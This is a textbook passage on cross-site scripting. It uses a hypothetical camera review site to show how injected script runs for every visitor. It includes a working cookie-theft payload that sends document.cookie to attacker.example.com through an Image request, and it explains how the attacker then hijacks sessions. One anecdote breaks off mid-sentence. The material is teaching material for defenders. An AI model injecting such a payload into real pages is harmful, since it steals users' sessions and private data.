## 7.2.1 XSS Attacks

How do attackers inject their code into your web application? Usually, this becomes possible when your application doesn’t filter input values sufficiently. For example, consider the hypothetical situation where the Camera Stork website (http://camerastork.com) displays user-submitted reviews on the main page without filtering any input data.

Because the output of the page is an HTML document, the attacker simply needs to embed their own HTML in the submitted review body, whereupon their HTML will be output to the page as-is. For example, if the attacker’s review contained the following code, all visitors to Camera Stork’s homepage would see a not-very-helpful alert message saying “Hello, World”:

This camera is great! I use it all the time.

```html
<script>
  alert("Hello, World");
</script>
```

This “Hello, World” alert message isn’t very scary—but it’s an example of a vulnerabil-
ity that can be exploited in many different ways to attack your users or your pub-
lisher’s visitors. For example, using this hole, an attacker can capture the session

token of an authenticated user by injecting JavaScript code that steals the contents of
that user’s cookies (see figure 7.1). And as you’re already aware, hijacking the user’s
session allows the attacker to access any data about the user stored with the affected
service, and perform malicious actions.
Accessing a user’s cookies via injected code is trivial; an attacker merely needs to
query the document.cookie property that you learned about in chapter 6. But just
accessing a user’s cookies isn’t enough—the attacker has to retrieve them. To do this,

the attacker needs to make the visitor’s browser issue an HTTP request with the con-
tents of the cookies to the attacker’s servers. There is no shortage of ways to do this:

they could append a new script element to the DOM, issue a CORS-compatible
XmlHttpRequest, and so on. But the easiest—and shortest—way is using the browser’s
Image JavaScript object.

This is a real story. Back in 2005, Chris Putnam and a couple of his friends wrote a worm for Facebook. The
worm exploited a cross-site scripting vulnerability they found in one of the Facebook profile fields and made
the social network look like its rival—MySpace. Chris Putnam was later

**Figure 7.1 An attacker stealing a user’s session by way of an XSS vulnerability**

Here’s an example code snippet injected by an attacker into a product review mes-
sage body:

This camera is great! I use it all the time.

<script>
var i = new Image();
i.src = "http://attacker.example.com/?c=" + document.cookie;
</script>

What does this code do? Every time this review is loaded, it generates a new Image
DOM element, but stops before attaching it to the document. Images that have never
been attached to the DOM aren’t visible to users; they’re stored only in memory and

nowhere else. But despite not being visible, browsers still issue HTTP requests to down-
load the corresponding image file,4

which is exactly what the attacker needs. The src
URL here (attacker.example.com) isn’t an image at all, but a server endpoint hosted
by the attacker that collects stolen cookies. You can see that the cookie data itself is
transferred using the target URL’s query string. When this code has been inserted into
the Camera Stork website, and is being requested by visitors, the attacker simply needs
to monitor their logs and store all the session identifiers they receive. Diabolical.
Usually, session identifiers aren’t attached to a particular computer, so the only

thing the attacker needs to do to complete their plan is to present any obtained iden-
tifiers as their own cookie data. After that, the attacker becomes an authenticated user

with permissions to do whatever they want, as far as your web server is concerned.
As you might’ve noticed, this attack isn’t actually noticeable by the user. The user
experience, unlike the previous “Hello, World” example, doesn’t differ from a regular,
4 The fact that browsers download images that are detached from DOM isn’t a bug. There are many use cases

for this behavior, for instance, to cause the browser to preload images before using them, or to obtain a ref-
erence to a source image for use with HTML5’s canvas element.

uncompromised page. This means that your users won’t be likely to report any prob-
lems until it’s too late and their sessions are stolen—an attacker is able to log in as

them, access their private data, and run unauthorized actions without approval. You
have to remember that the real attacker’s objective isn’t to execute an arbitrary
script—their real objective is to capture your user’s session.

---

#### From [[_2_cross-site-scripting]]

[//begin]: # "Autogenerated link references for markdown compatibility"
[_2_cross-site-scripting]: _2_cross-site-scripting "Cross-Site Scripting"
[//end]: # "Autogenerated link references"
